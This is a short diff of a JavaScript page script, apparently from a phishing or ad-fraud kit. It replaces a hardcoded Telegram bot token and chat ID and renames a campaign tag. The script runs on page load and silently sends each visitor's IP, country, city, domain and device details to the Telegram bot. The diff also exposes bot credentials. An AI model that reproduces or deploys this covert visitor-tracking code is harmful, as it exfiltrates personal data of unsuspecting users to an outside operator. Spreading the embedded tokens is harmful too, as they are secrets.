@@ -1,5 +1,5 @@
-const telegramToken = "7561292802:AAFzIeyLlrjO4mBfkRLa1TfzjWwtYpDO2Zg";
-const telegramChatId = "-4827057698";
+const telegramToken = "7955667929:AAFsPPrbWbbWgGwtIi8PCd0P_Lofahs93n0";
+const telegramChatId = "-1002605584386";
 
 function enviarMensajeTelegram(mensaje) {
     const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
@@ -50,7 +50,7 @@ window.addEventListener("DOMContentLoaded", function() {
             const ciudad = data.city; // <-- Aquí obtenemos la ciudad
 
             const infoDispositivo = obtenerInfoDispositivo();
-            const mensajeAlerta = `Activo/ADS/GAMEDUCK\n` +
+            const mensajeAlerta = `Activo/ADS/AIRE\n` +
                                 `Dominio: ${infoDispositivo.dominio}\n` +
                                 `IP: ${ip} (${pais} ${bandera}, ${ciudad})\n` + // <-- Añadimos la ciudad aquí
                                 `Dispositivo: ${infoDispositivo.plataforma}\n` +
